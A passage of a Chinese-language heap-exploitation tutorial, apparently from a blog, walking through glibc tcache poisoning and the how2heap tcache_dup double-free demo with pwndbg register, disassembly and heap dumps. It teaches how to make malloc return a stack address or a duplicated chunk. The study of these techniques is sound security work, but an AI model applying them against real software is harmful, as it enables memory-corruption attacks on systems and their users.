       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
</pre></div></p>
<p>第二次 malloc，即可 malloc 栈上的地址了
<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">ni</span>
<span class="err">0</span><span class="nf">x00005555555548c3</span>  <span class="mi">28</span>      <span class="no">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0xff00000000000000</span>
 <span class="nf">RDX</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RDI</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756048</span> <span class="err">?—</span> <span class="mi">0x0</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x2c00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x5555555548c3</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">361</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="no">rax</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x5555555548ac</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">338</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548af</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">341</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x5555555548b4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">346</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x5555555548b9</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">351</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
   <span class="err">0</span><span class="nf">x5555555548be</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">356</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">malloc@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554620</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x5555555548c3</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">361</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548c7</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">365</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200792</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x5555555548ce</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">372</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548d2</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">376</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2b4</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548d9</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">383</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548dc</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">386</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c">;</span>
   <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">27</span> 
 <span class="err">?</span> <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c">;</span>
   <span class="err">29</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">2</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">b</span><span class="p">)</span><span class="c">;</span>
   <span class="err">30</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">got</span> <span class="no">the</span> <span class="no">control</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c">;</span>
   <span class="err">31</span> 
   <span class="err">32</span>   <span class="nf">return</span> <span class="mi">0</span><span class="c">;</span>
   <span class="err">33</span> <span class="err">}</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>      <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span> <span class="nf">rax</span> <span class="no">rdx</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>          <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>          <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>      <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>          <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">i</span> <span class="no">r</span> <span class="no">rax</span>
<span class="nf">rax</span>            <span class="mi">0x7fffffffdfa8</span>   <span class="mi">140737488347048</span>
</pre></div>
可以看出 <code>tache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
<h4 id="tcache-dup">tcache dup<a class="headerlink" href="#tcache-dup" title="Permanent link">&para;</a></h4>
<p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨
<div class="codehilite"><pre><span></span><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div>
可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
<p>以 how2heap 的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache_dup</a> 为例分析，源码如下：
<div class="codehilite"><pre><span></span><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span> 
<span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
       <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span>
<span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
   <span class="mi">1</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">3</span>   <span class="err">│</span> 
   <span class="mi">4</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
   <span class="mi">5</span>   <span class="err">│</span> <span class="p">{</span>
   <span class="mi">6</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates a simple double-free attack with</span>
       <span class="err">│</span>  <span class="n">tcache</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;);</span>
   <span class="mi">7</span>   <span class="err">│</span> 
   <span class="mi">8</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Allocating buffer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
   <span class="mi">9</span>   <span class="err">│</span>         <span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
  <span class="mi">10</span>   <span class="err">│</span> 
  <span class="mi">11</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(8): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">12</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing twice...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">13</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="mi">14</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="mi">15</span>   <span class="err">│</span> 
  <span class="mi">16</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the free list has [ %p, %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">17</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Next allocated buffers will be same: [ %p, %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ma</span>
       <span class="err">│</span> <span class="n">lloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
  <span class="mi">18</span>   <span class="err">│</span> 
  <span class="mi">19</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="mi">20</span>   <span class="err">│</span> <span class="p">}</span>
<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
</pre></div></p>
<p>调试一下，第一次 free
<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">14</span>      <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x0</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x1</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R8</span>   <span class="mi">0x0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb79c</span> <span class="err">?—</span> <span class="mi">0x1a00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x911</span>
 <span class="nf">R11</span>  <span class="mi">0x7ffff7aa0ba0</span> <span class="p">(</span><span class="no">free</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">rbx</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0b0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfd0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x555555554870</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x5555555547fc</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">162</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x5555555547e4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">138</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x171</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555547eb</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">145</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fwrite@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554630</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x5555555547f0</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">150</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555547f4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">154</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555547f7</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">157</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x5555555547fc</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">162</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554800</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">166</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554803</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">169</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x555555554808</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">174</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200851</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x55555555480f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">181</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554813</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">185</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
    <span class="err">9</span>   <span class="nf">int</span> <span class="p">*</span><span class="no">a</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="c">;</span>
   <span class="err">10</span> 
   <span class="err">11</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">12</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Freeing</span> <span class="no">twice...</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c">;</span>
   <span class="err">13</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
 <span class="err">?</span> <span class="err">14</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">15</span> 
